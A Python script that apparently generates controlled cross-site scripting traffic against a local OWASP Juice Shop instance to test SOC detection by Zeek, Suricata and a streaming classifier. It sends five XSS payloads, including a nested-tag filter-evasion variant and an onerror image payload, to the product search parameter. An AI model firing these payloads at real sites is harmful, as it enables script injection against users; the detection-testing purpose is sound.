#!/usr/bin/env python3
"""
Controlled Cross-Site Scripting (XSS) Scenario against OWASP Juice Shop.
Injects reflective and DOM XSS audit payloads into search and feedback parameters.
Observed by: Zeek (http.log script tags & event handlers), Suricata
Detected by: Spark Structured Streaming & Web Application Threat Classifier
"""

import os
import time
import requests

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

XSS_PAYLOADS = [
    ("<script>alert('SOC_XSS_DETECTED')</script>", "Classic Script Tag Injection"),
    ("<iframe src=\"javascript:alert('XSS')\">", "Iframe DOM Injection Probe"),
    ("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "Nested Script Tag Filter Evasion"),
    ("<img src=x onerror=alert('IMG_XSS')>", "Inline Event-Handler Injection"),
    ("javascript:alert(document.domain)", "URI Scheme Protocol Injection")
]

def run_xss_probe(delay: float = 0.2):
    print(f"\n[!] INITIATING CONTROLLED CROSS-SITE SCRIPTING (XSS) PROBES against {BASE_URL}...")
    headers = {
        "User-Agent": "Mozilla/5.0 (Security-Audit-Scanner/XSS-Probe-1.0)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    
    injected_count = 0
    for idx, (payload, desc) in enumerate(XSS_PAYLOADS):
        # 1. Product search query parameter
        search_url = f"{BASE_URL}/rest/products/search?q={requests.utils.quote(payload)}"
        try:
            r = requests.get(search_url, headers=headers, timeout=2.0)
            injected_count += 1
            print(f"  [{idx+1}/{len(XSS_PAYLOADS)}] GET /rest/products/search?q=... -> HTTP {r.status_code} [XSS Payload Injected: {desc}]")
        except Exception as e:
            print(f"  [{idx+1}/{len(XSS_PAYLOADS)}] Search probe error: {e}")
            
        time.sleep(delay)
        
    print(f"[+] XSS probe sequence completed: {injected_count} vectors evaluated.")
    print(f"[*] Telemetry transmitted to Zeek http.log & Suricata for payload inspection.")
    return injected_count

if __name__ == "__main__":
    run_xss_probe()
